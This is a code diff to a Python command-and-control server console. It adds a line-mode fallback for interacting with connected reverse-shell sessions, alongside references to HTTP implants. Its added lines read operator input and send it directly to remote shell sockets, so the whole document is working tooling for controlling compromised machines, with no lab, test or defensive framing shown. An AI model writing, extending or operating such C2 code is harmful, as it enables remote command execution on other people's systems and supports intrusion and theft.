@@ -137,6 +137,8 @@ global_lock = threading.Lock()
 
 # When set to a shell_id, the console is in raw interactive mode with that shell
 interactive_shell_active_for_id = None
+# Fallback line-mode interaction (no raw TTY)
+line_mode_shell_id = None
 
 import http.server
 import socketserver
@@ -386,6 +388,36 @@ def interactive_shell_session(shell_id: int):
         sys.stdout.flush()
 
 
+def enter_shell_session(shell_id: int):
+    """Wrapper to enter shell session.
+
+    Tries raw TTY mode if stdin is a TTY; otherwise falls back to line mode
+    where the console reads lines and forwards them to the shell.
+    """
+    global current_session, line_mode_shell_id
+    try_raw = False
+    try:
+        try_raw = sys.stdin.isatty()
+    except Exception:
+        try_raw = False
+
+    if try_raw:
+        try:
+            interactive_shell_session(shell_id)
+            return
+        except Exception as e:
+            print(f"[*] Raw TTY mode failed ({e}). Falling back to line mode.")
+
+    # Fallback to line mode
+    with global_lock:
+        if shell_id not in shell_sessions:
+            print("[!] Shell is no longer active.")
+            return
+        current_session = ('shell', shell_id)
+        line_mode_shell_id = shell_id
+    print(f"[+] Interacting with shell {shell_id} in line mode. Type commands and press Enter. Press Ctrl-C to return to C2 console.")
+
+
 def wait_for_http_response(uid: str, timeout_seconds: int = 15):
     """Render a progress bar while waiting for an HTTP implant response, then print it.
 
@@ -434,7 +466,29 @@ def c2_console():
     print("\n[*] C2 Console Started. Type 'help' for commands.")
     while True:
         try:
-            cmd_input = input("C2 > ")
+            prompt = "C2 > "
+            with global_lock:
+                if line_mode_shell_id is not None and current_session == ('shell', line_mode_shell_id):
+                    prompt = ""
+            cmd_input = input(prompt)
+
+            # If in line-mode shell interaction, forward line directly
+            with global_lock:
+                if line_mode_shell_id is not None and current_session == ('shell', line_mode_shell_id):
+                    shell_id = line_mode_shell_id
+                    if shell_id in shell_sessions:
+                        shell_socket = shell_sessions[shell_id]['socket']
+                        try:
+                            shell_socket.sendall((cmd_input + '\n').encode())
+                        except Exception:
+                            print(f"\r[*] Failed to send to shell {shell_id}. It may have disconnected.")
+                            current_session = None
+                            line_mode_shell_id = None
+                    else:
+                        print("\r[*] Current shell has disconnected. Use 'list' and 'select'.")
+                        current_session = None
+                        line_mode_shell_id = None
+                    continue
 
             cmd_input = cmd_input.strip()
             if not cmd_input:
@@ -476,8 +530,7 @@ def c2_console():
                     if selection_id in list_map:
                         session_type, session_id = list_map[selection_id]
                         if session_type == 'shell':
-                            # Enter raw interactive mode for shells
-                            interactive_shell_session(session_id)
+                            enter_shell_session(session_id)
                         else:
                             with global_lock:
                                 current_session = ('http', session_id)
@@ -541,6 +594,12 @@ def c2_console():
                 if current_session and current_session[0] == 'shell':
                     print(f"\n[*] Disengaging from shell {current_session[1]}. Type 'list' to see sessions.")
                     current_session = None
+                    # Clear line-mode if active
+                    if line_mode_shell_id is not None:
+                        # Leaving line mode
+                        pass
+                    # Reset flag
+                    globals().update({"line_mode_shell_id": None})
                     continue
             print("\n[*] Keyboard interrupt received, exiting.")
             sys.exit(0)
